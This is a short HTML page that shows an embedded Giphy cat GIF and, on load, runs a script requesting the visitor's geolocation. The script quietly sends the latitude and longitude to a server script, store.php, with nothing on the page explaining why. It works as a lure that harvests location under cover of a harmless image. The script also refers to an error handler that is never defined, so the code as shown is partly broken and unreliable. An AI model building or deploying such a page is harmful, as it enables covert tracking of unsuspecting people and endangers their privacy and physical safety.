<!DOCTYPE html>
<html>
<body onload="getLocation()">
<iframe src="https://giphy.com/embed/EE185t7OeMbTy" width="480" height="480" 
  style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p>
  <a href="https://giphy.com/gifs/cat-kitty-kittens-EE185t7OeMbTy">via GIPHY</a></p>
  




<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function success(position) {
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
  xhttp.send();

}

</script>

</body>
</html>
